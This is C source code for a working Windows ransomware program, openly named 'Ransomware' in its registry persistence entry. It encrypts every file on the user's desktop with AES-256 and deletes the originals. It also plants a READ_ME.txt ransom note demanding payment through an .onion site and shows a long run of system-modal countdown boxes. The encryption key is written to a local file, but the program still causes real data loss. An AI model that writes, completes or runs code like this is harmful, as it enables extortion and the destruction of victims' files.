#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <shlobj.h>

#define AES_BLOCK_SIZE 16

// Function to generate a random key
void generate_key(unsigned char *key, int key_len) {
    if (RAND_bytes(key, key_len) != 1) {
        MessageBox(NULL, "Error generating key!", "Error", MB_ICONERROR);
        exit(1);
    }
}

// Function to log the encryption key to a file in C:\Users
void log_key(unsigned char *key, int key_len) {
    char key_file_path[MAX_PATH];
    snprintf(key_file_path, MAX_PATH, "C:\\Users\\key.txt");

    FILE *key_file = fopen(key_file_path, "w");
    if (key_file) {
        fprintf(key_file, "Encryption Key: ");
        for (int i = 0; i < key_len; i++) {
            fprintf(key_file, "%02X", key[i]);
        }
        fprintf(key_file, "\n");
        fclose(key_file);
    } else {
        MessageBox(NULL, "Error logging encryption key!", "Error", MB_ICONERROR);
    }
}

// Function to encrypt files using AES-256
void encrypt_file(const char *filename, unsigned char *key) {
    FILE *input = fopen(filename, "rb");
    if (!input) return;

    char output_filename[MAX_PATH];
    snprintf(output_filename, MAX_PATH, "%s.locked", filename);

    FILE *output = fopen(output_filename, "wb");
    if (!output) {
        fclose(input);
        return;
    }

    unsigned char iv[AES_BLOCK_SIZE];
    if (RAND_bytes(iv, AES_BLOCK_SIZE) != 1) {
        fclose(input);
        fclose(output);
        remove(output_filename);
        return;
    }

    fwrite(iv, 1, AES_BLOCK_SIZE, output);

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char buffer[1024];
    unsigned char encrypted[1024 + AES_BLOCK_SIZE];
    int len, outlen;

    while ((len = fread(buffer, 1, sizeof(buffer), input)) > 0) {
        EVP_EncryptUpdate(ctx, encrypted, &outlen, buffer, len);
        fwrite(encrypted, 1, outlen, output);
    }

    EVP_EncryptFinal_ex(ctx, encrypted, &outlen);
    fwrite(encrypted, 1, outlen, output);

    EVP_CIPHER_CTX_free(ctx);
    fclose(input);
    fclose(output);
    remove(filename);
}

// Function to traverse directories and encrypt files
void encrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA findData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", directory);

    HANDLE hFind = FindFirstFile(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;

        char full_path[MAX_PATH];
        snprintf(full_path, MAX_PATH, "%s\\%s", directory, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(full_path, key);
        } else {
            encrypt_file(full_path, key);
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
}

// Function to drop a ransom note
void drop_ransom_note(const char *desktop_path) {
    char ransom_note_path[MAX_PATH];
    snprintf(ransom_note_path, MAX_PATH, "%s\\READ_ME.txt", desktop_path);

    FILE *note = fopen(ransom_note_path, "w");
    if (note) {
        fprintf(note, "Oops! Your files have been encrypted.\n"
                     "If you see this text, your files are no longer accessible.\n"
                     "You might have been looking for a way to recover your files.\n"
                     "Don't waste your time. No one will be able to recover them\n"
                     "without our decryption service.\n"
                     "We guarantee that you can recover all your files safely.\n"
                     "All you need to do is submit the payment and get the decryption password.\n"
                     "Visit our web service at cybercat0123.onion");
        fclose(note);
    }
}

// Function to add the executable to startup
void add_to_startup() {
    char exe_path[MAX_PATH];
    if (GetModuleFileName(NULL, exe_path, MAX_PATH) == 0) {
        MessageBox(NULL, "Error getting EXE path!", "Error", MB_ICONERROR);
        return;
    }

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        MessageBox(NULL, "Error opening registry key!", "Error", MB_ICONERROR);
        return;
    }

    if (RegSetValueEx(hKey, "Ransomware", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1) != ERROR_SUCCESS) {
        MessageBox(NULL, "Error setting registry value!", "Error", MB_ICONERROR);
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);
}

// Function to display a non-closable MessageBox with a countdown timer
void show_countdown() {
    int time_left = 86400; // 24 hours in seconds
    while (time_left > 0) {
        char message[256];
        snprintf(message, sizeof(message), "Your files have been encrypted!\n"
                                           "Time remaining: %02d:%02d:%02d\n"
                                           "You cannot close this window.",
                 time_left / 3600, (time_left % 3600) / 60, time_left % 60);

        MessageBox(NULL, message, "WARNING", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
        Sleep(1000); // Wait for 1 second
        time_left--;
    }
}

int main() {
    // Generate the encryption key
    unsigned char aes_key[32];
    generate_key(aes_key, 32);

    // Log the encryption key to C:\Users\key.txt
    log_key(aes_key, 32);

    // Add the executable to startup
    add_to_startup();

    // Show a non-closable MessageBox with the ransom note
    MessageBox(NULL, "Oops! Your files have been encrypted.\n"
                     "If you see this text, your files are no longer accessible.\n"
                     "You might have been looking for a way to recover your files.\n"
                     "Don't waste your time. No one will be able to recover them\n"
                     "without our decryption service.\n"
                     "We guarantee that you can recover all your files safely.\n"
                     "All you need to do is submit the payment and get the decryption password.\n"
                     "Visit our web service at cybercat0123.onion",
               "WARNING", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);

    // Get the desktop path
    char desktop_path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path) != S_OK) {
        MessageBox(NULL, "Error getting desktop path!", "Error", MB_ICONERROR);
        return 1;
    }

    // Encrypt everything on the desktop (only once)
    static int encryption_done = 0;
    if (!encryption_done) {
        encrypt_directory(desktop_path, aes_key);
        encryption_done = 1; // Mark encryption as done
    }

    // Drop a ransom note
    drop_ransom_note(desktop_path);

    // Show the countdown timer
    show_countdown();

    return 0;
}